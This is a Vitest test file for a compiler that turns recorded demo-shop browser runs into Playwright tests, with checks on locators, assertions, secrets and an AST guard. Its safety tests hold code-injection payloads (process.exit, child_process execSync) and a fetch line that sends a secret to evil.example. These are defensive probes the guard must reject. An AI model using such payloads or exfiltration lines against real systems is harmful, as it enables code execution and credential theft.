import { execFile } from "node:child_process";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { createRequire } from "node:module";
import os from "node:os";
import path from "node:path";
import { promisify } from "node:util";
import {
  GeneratedTestSchema,
  type AcceptanceCriterion,
  type ElementRef,
  type ExpectedOutcome,
  type ExplorationStep,
  type FactValue,
  type LocatorCandidate,
  type NormalizedRequirement,
  type ObservedFact,
  type PlannedStep,
  type ProvisionalResult,
  type TestDataValue,
  type TestPlan,
} from "@platform/contracts";
import ts from "typescript";
import { describe, expect, it } from "vitest";
import type { StageContext } from "../orchestrator/stages";
import { checkGeneratedSource } from "./ast-guard";
import { createGenerateTestStage, type GeneratedTestStore } from "./generate-stage";
import { HELPER_EXPORTS, HELPERS_SOURCE } from "./helpers-template";
import { compilePlaywrightTest, type CompileTestInput } from "./test-compiler";

// ---------------------------------------------------------------------------------------------
// Fixture: the demo-shop flow as the executor records it
//   Navigate / → Click link Products → Fill Search with iPhone → Click iPhone 17 Pro →
//   [checkpoint before_add] → Click Add to cart → [checkpoint after_add]
// ---------------------------------------------------------------------------------------------

const TARGET = "https://shop.example.com/";
const XPATH = "/html[1]/body[1]/main[1]/a[3]";

const ref = (chosen: LocatorCandidate, extra: Partial<ElementRef> = {}): ElementRef => ({
  candidates: [chosen, { strategy: "xpath", selector: XPATH }],
  chosenIndex: 0,
  framePath: [],
  ...extra,
});
const byRole = (role: string, name: string) => ref({ strategy: "role", role, name, exact: true });
const byTestId = (value: string) => ref({ strategy: "testId", value });

type StepDraft = Partial<ExplorationStep> & Pick<ExplorationStep, "kind">;
const flow = (...drafts: StepDraft[]): ExplorationStep[] =>
  drafts.map((d, index) => ({
    id: d.kind === "checkpoint" ? `st_cp_${index}` : `st_${index}`,
    runId: "run_1",
    index,
    plannedStepId: null,
    instruction: `${d.kind} step`,
    element: null,
    inputRef: null,
    onGoldenPath: true,
    urlBefore: TARGET,
    urlAfter: TARGET,
    outcome: "SUCCESS",
    blockReason: null,
    error: null,
    startedAt: "2026-09-26T10:00:00.000Z",
    durationMs: 5,
    artifactIds: [],
    llm: null,
    ...d,
  }));

const shopFlow = (over: { productName?: string; fill?: Partial<ExplorationStep> } = {}) =>
  flow(
    { kind: "navigate", plannedStepId: "PS-1", instruction: `Navigate to ${TARGET}` },
    { kind: "observe", plannedStepId: "PS-2", onGoldenPath: false },
    { kind: "act", plannedStepId: "PS-2", element: byRole("link", "Products") },
    { kind: "fill", plannedStepId: "PS-3", element: byRole("searchbox", "Search"), inputRef: { source: "literal", key: "iPhone" }, ...over.fill },
    { kind: "act", plannedStepId: "PS-4", element: byRole("link", over.productName ?? "iPhone 17 Pro") },
    { kind: "checkpoint", plannedStepId: "PS-5" }, // index 5 → st_cp_5
    { kind: "act", plannedStepId: "PS-6", element: byRole("button", "Add to cart") },
    { kind: "checkpoint", plannedStepId: "PS-7" }, // index 7 → st_cp_7
  );
const BEFORE = "st_cp_5";
const AFTER = "st_cp_7";

const planned = (id: string, kind: PlannedStep["kind"], extra: Partial<PlannedStep> = {}): PlannedStep => ({
  id,
  kind,
  description: `${kind} ${id}`,
  criterionIds: [],
  destructive: false,
  ...extra,
});
const plan: TestPlan = {
  runId: "run_1",
  requirementRevision: 1,
  scenarios: [
    {
      id: "SC-1",
      title: "Add a product to the cart",
      criterionIds: ["AC-1"],
      steps: [
        planned("PS-1", "navigate"),
        planned("PS-2", "click"),
        planned("PS-3", "search", { inputRef: { source: "literal", key: "iPhone" } }),
        planned("PS-4", "click"),
        planned("PS-5", "capture_checkpoint", { checkpoint: "before_add" }),
        planned("PS-6", "click"),
        planned("PS-7", "capture_checkpoint", { checkpoint: "after_add" }),
      ],
    },
  ],
  blockedCriteria: [],
  stopConditions: [],
};

type Mode = NonNullable<ObservedFact["read"]>["mode"];
const fact = (key: string, stepId: string, value: FactValue, mode: Mode, element: ElementRef, provenance: ObservedFact["provenance"] = "DOM_VERIFIED"): ObservedFact => ({
  key,
  checkpoint: stepId === BEFORE ? "before_add" : "after_add",
  value,
  provenance,
  read: { element, mode },
  stepId,
});
const urlFact = (stepId: string): ObservedFact => ({
  key: "url",
  checkpoint: stepId === BEFORE ? "before_add" : "after_add",
  value: `${TARGET}products/iphone-17-pro`,
  provenance: "DOM_VERIFIED",
  read: null,
  stepId,
});
const shopFacts = (): ObservedFact[] => [
  urlFact(BEFORE),
  fact("cartCount", BEFORE, 0, "number", byTestId("cart-count")),
  urlFact(AFTER),
  fact("cartCount", AFTER, 1, "number", byTestId("cart-count")),
  fact("toast", AFTER, true, "visible", byTestId("toast")),
  fact("message", AFTER, "Added to cart", "text", byRole("status", "Cart status")),
  fact("miniCart", AFTER, ["iPhone 17 Pro"], "text_list", byTestId("mini-cart")),
];

const before = { key: "cartCount", checkpoint: "before_add" };
const after = { key: "cartCount", checkpoint: "after_add" };
const criterion = (id: string, expectedOutcome: ExpectedOutcome, statement = `Statement of ${id}`): AcceptanceCriterion => ({
  id,
  sourceText: "x",
  statement,
  expectedOutcome,
  preconditions: [],
  critical: true,
  ambiguity: null,
});
const shopCriteria = (): AcceptanceCriterion[] => [
  criterion("AC-1", { kind: "numeric_compare", left: after, operator: "gt", right: before }, "The cart count increases after adding a product"),
  criterion("AC-2", { kind: "visible", fact: { key: "toast", checkpoint: "after_add" }, expected: true }),
  criterion("AC-3", { kind: "text_matches", fact: { key: "message", checkpoint: "after_add" }, match: { mode: "contains", value: "added", caseSensitive: false } }),
  criterion("AC-4", { kind: "collection_contains", collection: { key: "miniCart", checkpoint: "after_add" }, item: "iPhone 17 Pro", match: "contains" }),
  criterion("AC-5", { kind: "semantic", description: "The product page looks trustworthy" }),
];
const requirementOf = (criteria: AcceptanceCriterion[]): NormalizedRequirement => ({
  runId: "run_1",
  revision: 1,
  originalText: "x",
  criteria,
  facts: [],
  confirmedAt: "2026-09-26T10:00:00.000Z",
});
const provisionalOf = (criteria: AcceptanceCriterion[], statuses: Record<string, ProvisionalResult["status"]> = {}): ProvisionalResult[] =>
  criteria.map((c) => {
    const status = statuses[c.id] ?? (c.expectedOutcome.kind === "semantic" ? "INCONCLUSIVE" : "PASS");
    return {
      criterionId: c.id,
      status,
      reason: status === "BLOCKED" ? "MISSING_SECRET" : status === "INCONCLUSIVE" ? (c.expectedOutcome.kind === "semantic" ? "AI_JUDGED_ONLY" : "FACT_NOT_OBSERVED") : null,
      factRefs: [],
      expected: "x",
      actual: null,
    };
  });

function input(over: Partial<CompileTestInput> & { statuses?: Record<string, ProvisionalResult["status"]> } = {}): CompileTestInput {
  const { statuses, ...rest } = over;
  const criteria = rest.requirement?.criteria ?? shopCriteria();
  return {
    requirement: requirementOf(criteria),
    plan,
    steps: shopFlow(),
    facts: shopFacts(),
    provisional: provisionalOf(criteria, statuses),
    targetUrl: TARGET,
    secretNames: [],
    testData: {},
    ...rest,
  };
}
const compile = (over: Parameters<typeof input>[0] = {}) => compilePlaywrightTest(input(over));

/** The source of one criterion's `test.step` block (from its title line to its closing line). */
function stepBlock(source: string, id: string): string {
  const start = source.indexOf(`await test.step(${JSON.stringify(`[${id}] `)} + data.criteria[${JSON.stringify(id)}].statement, async () => {`);
  if (start < 0) return "";
  const end = source.indexOf("\n  });", start);
  return source.slice(start, end + "\n  });".length);
}

/** Module specifiers of every import declaration. */
function importsOf(source: string): string[] {
  const file = ts.createSourceFile("run.spec.ts", source, ts.ScriptTarget.ES2022, true, ts.ScriptKind.TS);
  return file.statements.filter(ts.isImportDeclaration).map((d) => (d.moduleSpecifier as ts.StringLiteral).text);
}

const dataOf = (dataJson: string) => JSON.parse(dataJson) as { targetUrl: string; locators: Record<string, Record<string, string>>; inputs: Record<string, string>; urls: Record<string, string>; criteria: Record<string, Record<string, unknown>> };

// ---------------------------------------------------------------------------------------------
// Step 1: the discovered flow as a Playwright test
// ---------------------------------------------------------------------------------------------

describe("compilePlaywrightTest: the discovered flow (snapshot)", () => {
  it("replays the golden path with semantic locators; every value comes from run-data.json", () => {
    const out = compile();
    expect(out.source).toMatchSnapshot();
    expect(GeneratedTestSchema.omit({ id: true }).parse(out)).toEqual(out);

    expect(importsOf(out.source).sort()).toEqual(["./helpers", "./run-data.json", "@playwright/test"]);
    expect(out.source).toContain("await page.goto(data.targetUrl);");
    const data = dataOf(out.dataJson);
    expect(data.targetUrl).toBe(TARGET);

    // Replay order: the golden steps, in index order (the observe is not replayed).
    const actions = [...out.source.matchAll(/await (page\.goto|.*\.(click|fill))\(/g)].map((m) => m[2] ?? "goto");
    expect(actions).toEqual(["goto", "click", "fill", "click", "click"]);
    expect(out.source).toContain('page.getByRole("link", { name: data.locators.');
    expect(out.source).not.toMatch(/xpath=|css=/);

    // "iPhone" is read from data, never written into the source.
    expect(out.source).not.toContain("iPhone");
    expect(out.source).toMatch(/\.fill\(data\.inputs\.input1\);/);
    expect(data.inputs.input1).toBe("iPhone");
    expect(Object.values(data.locators).map((l) => l.name ?? l.value)).toEqual(
      expect.arrayContaining(["Products", "Search", "iPhone 17 Pro", "Add to cart", "cart-count"]),
    );

    expect(out.compiledCriteria).toEqual(["AC-1", "AC-2", "AC-3", "AC-4"]);
    expect(out.notCompiled).toEqual([{ criterionId: "AC-5", reason: expect.stringMatching(/semantic/i) }]);
    expect(out.helpersSource).toBe(HELPERS_SOURCE);
    expect(checkGeneratedSource(out.source)).toEqual([]);
  });

  it("a select step (recorded as fill) replays as selectOption; test data values go to run-data.json as strings", () => {
    const steps = shopFlow({ fill: { plannedStepId: "PS-8", element: byRole("combobox", "Size"), inputRef: { source: "testData", key: "size" } } });
    const selectPlan = { ...plan, scenarios: [{ ...plan.scenarios[0]!, steps: [...plan.scenarios[0]!.steps, planned("PS-8", "select", { inputRef: { source: "testData", key: "size" } })] }] };
    const out = compile({ steps, plan: selectPlan, testData: { size: 42 } });
    expect(out.source).toMatch(/page\.getByRole\("combobox", \{ name: data\.locators\.loc\d+\.name, exact: true \}\)\.selectOption\(data\.inputs\.input1\);/);
    expect(dataOf(out.dataJson).inputs.input1).toBe("42");
  });

  it("a later navigate step replays as page.goto to its URL from run-data.json", () => {
    const steps = flow(
      { kind: "navigate", plannedStepId: "PS-1", instruction: `Navigate to ${TARGET}` },
      { kind: "navigate", plannedStepId: "PS-2", instruction: `Navigate to ${TARGET}cart`, urlAfter: `${TARGET}cart` },
      { kind: "checkpoint", plannedStepId: "PS-3" },
    );
    const facts = [fact("cartCount", "st_cp_2", 1, "number", byTestId("cart-count"))];
    const out = compile({
      steps,
      facts,
      requirement: requirementOf([criterion("AC-1", { kind: "numeric_compare", left: after, operator: "eq", right: 1 })]),
    });
    expect(out.source).toContain("await page.goto(data.targetUrl);\n  await page.goto(data.urls.url1);");
    expect(dataOf(out.dataJson).urls.url1).toBe(`${TARGET}cart`);
    expect(out.source).toContain('.toBeCloseTo(data.criteria["AC-1"].right, 9)');
  });

  it("replays nothing after the last checkpoint a compiled criterion needs", () => {
    const steps = [...shopFlow(), ...flow({ kind: "act", element: byRole("link", "Checkout") }).map((s) => ({ ...s, index: 8, id: "st_8" }))];
    const out = compile({ steps });
    expect(JSON.stringify(dataOf(out.dataJson).locators)).not.toContain("Checkout");
    expect(out.source.trimEnd().endsWith("});")).toBe(true);
  });
});

// ---------------------------------------------------------------------------------------------
// Step 2: locator priority
// ---------------------------------------------------------------------------------------------

describe("compilePlaywrightTest: locators", () => {
  const withAddToCart = (element: ElementRef) =>
    compile({ steps: shopFlow().map((s) => (s.plannedStepId === "PS-6" ? { ...s, element } : s)) });
  const lineOf = (source: string, suffix: string) => source.split("\n").find((l) => l.endsWith(suffix)) ?? "";

  it("role + name → page.getByRole(role, { name }), never CSS/XPath", () => {
    const out = withAddToCart(byRole("button", "Add to cart"));
    const line = out.source.split("\n").find((l) => l.includes('getByRole("button"'))!;
    expect(line).toMatch(/^  await page\.getByRole\("button", \{ name: data\.locators\.(loc\d+)\.name, exact: true \}\)\.click\(\);$/);
    const key = /data\.locators\.(loc\d+)/.exec(line)![1]!;
    expect(dataOf(out.dataJson).locators[key]).toEqual({ name: "Add to cart" });
    expect(out.notes).toEqual([]);
  });

  it("an element located only by XPath → XPath locator, a // brittle-locator comment and a note", () => {
    const out = withAddToCart({ candidates: [{ strategy: "xpath", selector: "/html[1]/body[1]/div[2]/button[1]" }], chosenIndex: 0, framePath: [] });
    const lines = out.source.split("\n");
    const at = lines.findIndex((l) => /page\.locator\(data\.locators\.loc\d+\.selector\)\.click\(\);$/.test(l));
    expect(at).toBeGreaterThan(0);
    expect(lines[at - 1]!.trim()).toBe("// brittle-locator");
    const key = /data\.locators\.(loc\d+)/.exec(lines[at]!)![1]!;
    expect(dataOf(out.dataJson).locators[key]).toEqual({ selector: "xpath=/html[1]/body[1]/div[2]/button[1]" });
    expect(out.notes).toEqual([expect.stringMatching(/step 6 .*XPath.*brittle-locator/i)]);
  });

  it("uses the recorded (chosen) candidate, like the recorder's resolveElement", () => {
    const out = withAddToCart({
      candidates: [{ strategy: "role", role: "button", name: "Add to cart", exact: true }, { strategy: "text", text: "Add to cart", exact: true }],
      chosenIndex: 1,
      framePath: [],
    });
    expect(lineOf(out.source, ".click();")).toBeTruthy();
    expect(out.source).toMatch(/await page\.getByText\(data\.locators\.loc\d+\.text, \{ exact: true \}\)\.click\(\);/);
    expect(out.source).not.toContain('getByRole("button"');
  });

  it.each<[LocatorCandidate, RegExp, Record<string, string>]>([
    [{ strategy: "label", text: "Email" }, /page\.getByLabel\(data\.locators\.loc\d+\.text, \{ exact: true \}\)\.click\(\);/, { text: "Email" }],
    [{ strategy: "placeholder", text: "Search products" }, /page\.getByPlaceholder\(data\.locators\.loc\d+\.text, \{ exact: true \}\)\.click\(\);/, { text: "Search products" }],
    [{ strategy: "text", text: "Buy", exact: false }, /page\.getByText\(data\.locators\.loc\d+\.text, \{ exact: false \}\)\.click\(\);/, { text: "Buy" }],
    [{ strategy: "testId", value: "buy" }, /page\.getByTestId\(data\.locators\.loc\d+\.value\)\.click\(\);/, { value: "buy" }],
    [{ strategy: "css", selector: "#add" }, /page\.locator\(data\.locators\.loc\d+\.selector\)\.click\(\);/, { selector: "css=#add" }],
  ])("%j → the same Playwright locator the recorder resolved", (candidate, pattern, stored) => {
    const out = withAddToCart({ candidates: [candidate], chosenIndex: 0, framePath: [] });
    expect(out.source).toMatch(pattern);
    expect(Object.values(dataOf(out.dataJson).locators)).toContainEqual(stored);
  });

  it("an element the recorder could not replay (not in the main frame) → the flow is not replayable, nothing compiles", () => {
    const out = withAddToCart({ ...byRole("button", "Add to cart"), framePath: ["iframe#shop"] });
    expect(out.compiledCriteria).toEqual([]);
    for (const id of ["AC-1", "AC-2", "AC-3", "AC-4"]) {
      expect(out.notCompiled).toContainEqual({ criterionId: id, reason: expect.stringMatching(/cannot be replayed.*step 6/i) });
    }
  });
});

// ---------------------------------------------------------------------------------------------
// Step 3: assertion policy
// ---------------------------------------------------------------------------------------------

describe("compilePlaywrightTest: assertions", () => {
  it("each compiled criterion's assertions sit inside test.step('[AC-n] <statement>'), soft, with an '[AC-n] …' message", () => {
    const out = compile();
    const data = dataOf(out.dataJson);
    for (const id of out.compiledCriteria) {
      const block = stepBlock(out.source, id);
      expect(block, id).not.toBe("");
      expect(block).toContain(`const message = "[${id}] " + data.criteria["${id}"].statement;`);
      const assertions = block.split("\n").filter((l) => /expect/i.test(l));
      expect(assertions.length).toBeGreaterThan(0);
      for (const a of assertions) expect(a).toMatch(/expect\.soft\(.*, message\)|softExpect\.poll\(.*\{ message \}\)/);
    }
    expect(data.criteria["AC-1"]!.statement).toBe("The cart count increases after adding a product");
    // Outside the steps: no assertion; navigation and actions stay hard (plain awaits).
    const outside = out.compiledCriteria.reduce((s, id) => s.replace(stepBlock(s, id), ""), out.source);
    expect(outside).not.toMatch(/expect(\.soft)?\(|softExpect\.poll/);
    expect(outside).toContain("const softExpect = expect.configure({ soft: true });");
  });

  it("each criterion's step sits at the latest checkpoint it references; earlier facts are read into variables at their own checkpoint", () => {
    const out = compile();
    const src = out.source;
    const readBefore = src.indexOf("const fact1 = await readNumber(page.getByTestId(data.locators.");
    const addToCart = src.search(/getByRole\("button", \{ name: data\.locators\.loc\d+\.name, exact: true \}\)\.click\(\)/);
    const ac1 = src.indexOf(stepBlock(src, "AC-1"));
    expect(readBefore).toBeGreaterThan(0);
    expect(readBefore).toBeLessThan(addToCart);
    expect(addToCart).toBeLessThan(ac1);
    // The "after" value is polled (the badge may update after the click), compared with the saved "before".
    expect(stepBlock(src, "AC-1")).toContain("expect.soft(fact1, message).not.toBeNull();");
    expect(stepBlock(src, "AC-1")).toMatch(
      /await softExpect\.poll\(\(\) => readNumber\(page\.getByTestId\(data\.locators\.loc\d+\.value\), 0\), \{ message \}\)\.toBeGreaterThan\(fact1 \?\? Number\.NaN\);/,
    );
  });

  it("every fact at the criterion's own checkpoint is re-read inside the poll (none is read once before the step)", () => {
    const facts = [...shopFacts(), fact("subtotal", AFTER, 1299, "number", byTestId("subtotal"))];
    const subtotal = { key: "subtotal", checkpoint: "after_add" };
    const out = compile({
      facts,
      requirement: requirementOf([
        criterion("AC-1", { kind: "numeric_compare", left: subtotal, operator: "gte", right: after }),
        criterion("AC-2", { kind: "collection_contains", collection: { key: "miniCart", checkpoint: "after_add" }, item: { key: "message", checkpoint: "after_add" }, match: "equals" }),
      ]),
    });
    expect(out.compiledCriteria).toEqual(["AC-1", "AC-2"]);
    expect(out.source).not.toContain("const fact");
    expect(out.source).not.toContain("not.toBeNull");
    expect(stepBlock(out.source, "AC-1")).toMatch(
      /await softExpect\.poll\(async \(\) => difference\(await readNumber\(page\.getByTestId\(data\.locators\.loc\d+\.value\), 0\), await readNumber\(page\.getByTestId\(data\.locators\.loc\d+\.value\), 0\)\), \{ message \}\)\.toBeGreaterThanOrEqual\(0\);/,
    );
    expect(stepBlock(out.source, "AC-2")).toMatch(
      /await softExpect\.poll\(async \(\) => listContains\(await readTextList\(page\.getByTestId\(data\.locators\.loc\d+\.value\), 0\), await readText\(page\.getByRole\("status", \{ name: data\.locators\.loc\d+\.name, exact: true \}\), 0\), "equals"\), \{ message \}\)\.toBe\(true\);/,
    );
  });

  it("each checkpoint first waits (bounded, best effort) for the page's load state, like the executor's settle", () => {
    const lines = compile().source.split("\n");
    const checkpoints = lines.flatMap((l, i) => (l.trim().startsWith("// Checkpoint") ? [i] : []));
    expect(checkpoints).toHaveLength(2);
    for (const i of checkpoints) expect(lines[i + 1]!.trim()).toBe('await page.waitForLoadState("load", { timeout: 10000 }).catch(() => {});');
  });

  it("visible → web-first toBeVisible / toBeHidden", () => {
    const out = compile();
    expect(stepBlock(out.source, "AC-2")).toMatch(/await expect\.soft\(page\.getByTestId\(data\.locators\.loc\d+\.value\), message\)\.toBeVisible\(\);/);
    const hidden = compile({ requirement: requirementOf([criterion("AC-2", { kind: "visible", fact: { key: "toast", checkpoint: "after_add" }, expected: false })]) });
    expect(stepBlock(hidden.source, "AC-2")).toMatch(/\.toBeHidden\(\);/);
  });

  it("text_matches → toHaveText / toContainText (case per criterion); regex and URL facts are polled with the verifier's normalization", () => {
    const textCriterion = (match: { mode: "equals" | "contains" | "regex"; value: string; caseSensitive: boolean }, key = "message") =>
      requirementOf([criterion("AC-3", { kind: "text_matches", fact: { key, checkpoint: "after_add" }, match })]);
    const contains = compile();
    expect(stepBlock(contains.source, "AC-3")).toMatch(
      /await expect\.soft\(page\.getByRole\("status", \{ name: data\.locators\.loc\d+\.name, exact: true \}\), message\)\.toContainText\(data\.criteria\["AC-3"\]\.value, \{ ignoreCase: true, useInnerText: true \}\);/,
    );
    expect(dataOf(contains.dataJson).criteria["AC-3"]).toEqual({ statement: "Statement of AC-3", value: "added" });

    const equals = compile({ requirement: textCriterion({ mode: "equals", value: "Added to cart", caseSensitive: true }) });
    expect(stepBlock(equals.source, "AC-3")).toMatch(/\.toHaveText\(data\.criteria\["AC-3"\]\.value, \{ ignoreCase: false, useInnerText: true \}\);/);

    const regex = compile({ requirement: textCriterion({ mode: "regex", value: "^Added\\b", caseSensitive: false }) });
    expect(stepBlock(regex.source, "AC-3")).toMatch(
      /await softExpect\.poll\(async \(\) => collapseText\(await readText\(page\.getByRole\("status", .*\), 0\)\), \{ message \}\)\.toMatch\(new RegExp\(data\.criteria\["AC-3"\]\.pattern, "i"\)\);/,
    );
    expect(dataOf(regex.dataJson).criteria["AC-3"]!.pattern).toBe("^Added\\b");

    const url = compile({ requirement: textCriterion({ mode: "contains", value: "/products/", caseSensitive: false }, "url") });
    expect(stepBlock(url.source, "AC-3")).toContain(
      'await softExpect.poll(() => foldText(page.url()), { message }).toContain(foldText(data.criteria["AC-3"].value));',
    );
  });

  it("numeric_delta → the polled difference is close to the expected delta", () => {
    const out = compile({ requirement: requirementOf([criterion("AC-1", { kind: "numeric_delta", before, after, delta: 1 })]) });
    expect(stepBlock(out.source, "AC-1")).toMatch(
      /await softExpect\.poll\(async \(\) => difference\(await readNumber\(page\.getByTestId\(data\.locators\.loc\d+\.value\), 0\), fact1\), \{ message \}\)\.toBeCloseTo\(data\.criteria\["AC-1"\]\.delta, 9\);/,
    );
    expect(dataOf(out.dataJson).criteria["AC-1"]!.delta).toBe(1);
  });

  it("numeric_compare against a later fact flips the operator so the later (polled) value is on the left", () => {
    const out = compile({ requirement: requirementOf([criterion("AC-1", { kind: "numeric_compare", left: before, operator: "lt", right: after })]) });
    expect(stepBlock(out.source, "AC-1")).toMatch(/\.poll\(\(\) => readNumber\(.*\), \{ message \}\)\.toBeGreaterThan\(fact1 \?\? Number\.NaN\);/);
  });

  it("collection_contains → the list is read like the fact reader (children's text) and searched with the verifier's matching", () => {
    const out = compile();
    expect(stepBlock(out.source, "AC-4")).toMatch(
      /await softExpect\.poll\(async \(\) => listContains\(await readTextList\(page\.getByTestId\(data\.locators\.loc\d+\.value\), 0\), data\.criteria\["AC-4"\]\.item, "contains"\), \{ message \}\)\.toBe\(true\);/,
    );
    expect(dataOf(out.dataJson).criteria["AC-4"]).toEqual({ statement: "Statement of AC-4", item: "iPhone 17 Pro" });
  });

  it("not compiled, with a reason: provisional BLOCKED / INCONCLUSIVE, any MODEL_EXTRACTED fact, semantic outcomes", () => {
    const facts = shopFacts().map((f) => (f.key === "toast" ? { ...f, provenance: "MODEL_EXTRACTED" as const } : f));
    const out = compile({ facts, statuses: { "AC-3": "BLOCKED", "AC-4": "INCONCLUSIVE" } });
    expect(out.compiledCriteria).toEqual(["AC-1"]);
    expect(out.notCompiled).toEqual([
      { criterionId: "AC-2", reason: "Fact toast@after_add was extracted by the model, not read from the page" },
      { criterionId: "AC-3", reason: "Provisional result is BLOCKED (MISSING_SECRET)" },
      { criterionId: "AC-4", reason: "Provisional result is INCONCLUSIVE (FACT_NOT_OBSERVED)" },
      { criterionId: "AC-5", reason: "AI-judged (semantic) criteria are never compiled" },
    ]);
    for (const id of ["AC-2", "AC-3", "AC-4", "AC-5"]) {
      expect(out.source).not.toContain(`"[${id}] "`);
      expect(dataOf(out.dataJson).criteria[id]).toBeUndefined();
    }
  });

  it("a fact recorded more than once at a checkpoint: the LAST reading counts (as for the verifier, reconcile and relatedStepIds)", () => {
    // First reading model-extracted, the last one read from the DOM through another element.
    const recorded = shopFacts();
    const toast = recorded.find((f) => f.key === "toast")!;
    const facts = [...recorded.filter((f) => f !== toast), { ...toast, provenance: "MODEL_EXTRACTED" as const }, { ...toast, read: { element: byTestId("toast-v2"), mode: "visible" as const } }];
    const out = compile({ facts });
    expect(out.compiledCriteria).toContain("AC-2");
    expect(Object.values(dataOf(out.dataJson).locators)).toContainEqual({ value: "toast-v2" });
    expect(Object.values(dataOf(out.dataJson).locators)).not.toContainEqual({ value: "toast" });

    // And the other way round: a DOM reading superseded by a model-extracted one is not compiled.
    const superseded = compile({ facts: [...shopFacts(), { ...toast, provenance: "MODEL_EXTRACTED" as const }] });
    expect(superseded.notCompiled).toContainEqual({ criterionId: "AC-2", reason: "Fact toast@after_add was extracted by the model, not read from the page" });
  });

  it("not compiled: a fact read in a mode the assertion cannot replay, or captured off the replayed flow", () => {
    const facts = shopFacts().map((f) =>
      f.key === "message" ? { ...f, read: { ...f.read!, mode: "count" as const } } : f.key === "miniCart" ? { ...f, stepId: "st_elsewhere" } : f,
    );
    const out = compile({ facts });
    expect(out.notCompiled).toEqual(
      expect.arrayContaining([
        { criterionId: "AC-3", reason: "Fact message@after_add was read as count, which this assertion cannot replay" },
        { criterionId: "AC-4", reason: "Fact miniCart@after_add was not captured on the replayed flow" },
      ]),
    );
    expect(out.compiledCriteria).toEqual(["AC-1", "AC-2"]);
  });
});

// ---------------------------------------------------------------------------------------------
// Step 4: safety
// ---------------------------------------------------------------------------------------------

const INJECTION = '"); process.exit(1); ("';
const TEMPLATE_INJECTION = "`${require('child_process').execSync('id')}` */ /*";

describe("compilePlaywrightTest: injection safety", () => {
  it("page text, test data and criterion text appear only in run-data.json; the source parses and passes the AST guard", () => {
    const steps = shopFlow({ productName: INJECTION, fill: { inputRef: { source: "testData", key: "query" } } });
    const planWithTestData = { ...plan, scenarios: [{ ...plan.scenarios[0]!, steps: plan.scenarios[0]!.steps.map((s) => (s.id === "PS-3" ? { ...s, inputRef: { source: "testData" as const, key: "query" } } : s)) }] };
    const criteria = shopCriteria().map((c) =>
      c.id === "AC-3" ? { ...c, statement: `${INJECTION}\n${TEMPLATE_INJECTION}`, expectedOutcome: { ...c.expectedOutcome, match: { mode: "contains" as const, value: TEMPLATE_INJECTION, caseSensitive: false } } as ExpectedOutcome } : c,
    );
    const out = compile({ steps, plan: planWithTestData, testData: { query: TEMPLATE_INJECTION }, requirement: requirementOf(criteria) });

    for (const hostile of [INJECTION, TEMPLATE_INJECTION, "process.exit", "child_process", "execSync", "${"]) {
      expect(out.source).not.toContain(hostile);
      expect(out.helpersSource).not.toContain(hostile);
    }
    const data = dataOf(out.dataJson);
    expect(Object.values(data.locators)).toContainEqual({ name: INJECTION });
    expect(data.inputs.input1).toBe(TEMPLATE_INJECTION);
    expect(data.criteria["AC-3"]).toEqual({ statement: `${INJECTION}\n${TEMPLATE_INJECTION}`, value: TEMPLATE_INJECTION });
    expect(checkGeneratedSource(out.source)).toEqual([]);
    expect(out.compiledCriteria).toContain("AC-3");
  });

  it("secrets: the source reads process.env.SECRET_<NAME>; no secret value anywhere in the output", () => {
    const SECRET = "pw-Hunter2-Secret";
    const steps = shopFlow({ fill: { element: byRole("textbox", "Password"), inputRef: { source: "secret", key: "password" } } });
    const out = compile({ steps, secretNames: ["password"], testData: { user: "alice" } });
    expect(out.source).toMatch(/\.fill\(secret\(process\.env\.SECRET_PASSWORD\)\);/);
    expect(JSON.stringify(out)).not.toContain(SECRET);
    expect(out.dataJson).not.toContain("password");
    expect(checkGeneratedSource(out.source)).toEqual([]);
  });

  it("a secret fill the run has no secret for → the flow is not replayable", () => {
    const steps = shopFlow({ fill: { inputRef: { source: "secret", key: "password" } } });
    const out = compile({ steps, secretNames: [] });
    expect(out.compiledCriteria).toEqual([]);
    expect(out.notCompiled[0]!.reason).toMatch(/cannot be replayed.*step 3/i);
  });
});

describe("AST guard", () => {
  const header = 'import { expect, test } from "@playwright/test";\nimport { secret } from "./helpers";\nimport data from "./run-data.json";\n';
  const inTest = (body: string) => `${header}test("discovered flow", async ({ page }) => {\n${body}\n});\n`;

  it("accepts the template's grammar, incl. <locator>.fill(secret(process.env.SECRET_<NAME>))", () => {
    const source = inTest(
      [
        "await page.goto(data.targetUrl);",
        "await page.getByLabel(data.locators.loc1.text, { exact: true }).fill(secret(process.env.SECRET_PASSWORD));",
        'await test.step("[AC-1] " + data.criteria["AC-1"].statement, async () => {',
        '  await expect.soft(page.getByRole("button", { name: data.locators.loc2.name, exact: true }), "[AC-1] ").toBeVisible();',
        "});",
      ].join("\n"),
    );
    expect(checkGeneratedSource(source)).toEqual([]);
  });

  it.each([
    // Reviewer probes: escapes a denylist missed (CommonJS wrapper arguments, Function via a built string, exfiltration).
    ['arguments[1]("child_process").execSync("id");', /arguments/],
    ['Object.getOwnPropertyDescriptor(Object.getPrototypeOf(() => 0), "con" + "structor")!.value("return pro" + "cess")().exit(1);', /Object/],
    ['await fetch("https://evil.example/?d=" + process.env.SECRET_PASSWORD);', /fetch[\s\S]*process/],
    ["const d = __dirname;", /__dirname/],
    ['const b = Buffer.from("x");', /Buffer/],
    // A secret anywhere but as the whole value of a fill.
    ["await page.goto(data.targetUrl + secret(process.env.SECRET_PASSWORD));", /process/],
    ['await page.getByLabel(data.locators.loc1.text).fill(data.inputs.input1 + secret(process.env.SECRET_PASSWORD));', /process/],
    ["const s = secret(process.env.SECRET_PASSWORD);", /process/],
    // Literals and access outside the template.
    ['await page.goto("https://evil.example/");', /string literal/],
    ["const t = `x`;", /template/],
    ["const r = /x/;", /regular expression/],
    ["const x = data.locators[1];", /computed/],
    ['const x = data.criteria["constructor"];', /computed/],
  ])("rejects %s inside the generated test", (body, why) => {
    const violations = checkGeneratedSource(inTest(body));
    expect(violations.length).toBeGreaterThan(0);
    expect(violations.join("\n")).toMatch(why);
  });

  it.each([
    ['import { request } from "@playwright/test";', /import of "request"/],
    ['import { test as page } from "@playwright/test";', /import of "test as page"/],
    ['import { exec } from "./helpers";', /import of "exec"/],
    ['import * as data from "./run-data.json";', /only "import data/],
    ['import "./helpers";', /side-effect import/],
  ])("rejects the import %s", (source, why) => {
    expect(checkGeneratedSource(source).join("\n")).toMatch(why);
  });

  it("HELPER_EXPORTS lists exactly what helpers.ts exports", () => {
    const exported = [...HELPERS_SOURCE.matchAll(/^export (?:async )?function (\w+)/gm)].map((m) => m[1]);
    expect([...HELPER_EXPORTS].sort()).toEqual(exported.sort());
  });

  it.each([
